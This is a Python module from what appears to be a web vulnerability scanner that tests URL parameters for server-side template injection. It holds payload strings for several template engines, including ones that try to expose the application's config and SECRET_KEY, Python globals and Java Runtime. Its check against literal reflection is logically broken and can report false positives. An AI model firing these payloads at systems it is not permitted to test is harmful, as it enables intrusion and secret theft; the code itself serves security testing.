"""
SSTI Scanner — Server-Side Template Injection detection.
Ref: awesome-bugbounty-tools (tplmap, SSTImap).
"""
from urllib.parse import urlparse, urlencode
from .utils import stealth_headers, safe_get

SSTI_PAYLOADS = {
    "{{7*7}}": "49",
    "{{7*'7'}}": "7777777",
    "${7*7}": "49",
    "#{7*7}": "49",
    "<%= 7*7 %>": "49",
    "{{config}}": "SECRET_KEY",
    "{{self.__class__}}": "__class__",
    "${T(java.lang.Runtime)}": "java.lang.Runtime",
    "{{request.application.__globals__}}": "__builtins__",
}

SSTI_PARAMS = ["name", "template", "page", "view", "q", "search", "msg", "text", "content"]


def check_ssti(url):
    """Test URL parameters for SSTI using math-expression polyglot payloads."""
    findings = []
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    for param in SSTI_PARAMS[:5]:
        for payload, expected in list(SSTI_PAYLOADS.items())[:5]:
            target = f"{base}?{param}={payload}"
            r = safe_get(target)
            if not r:
                continue

            if expected in r.text:
                # Verify it's not just reflecting the payload literally
                if payload not in r.text or expected != payload:
                    severity = "CRITICAL" if "config" in payload or "__globals__" in expected else "HIGH"
                    findings.append({
                        "type": "SSTI",
                        "url": target,
                        "severity": severity,
                        "confidence": "HIGH",
                        "detail": f"Template injection confirmed: {payload} → {expected}"
                    })
                    return findings

    return findings if findings else None
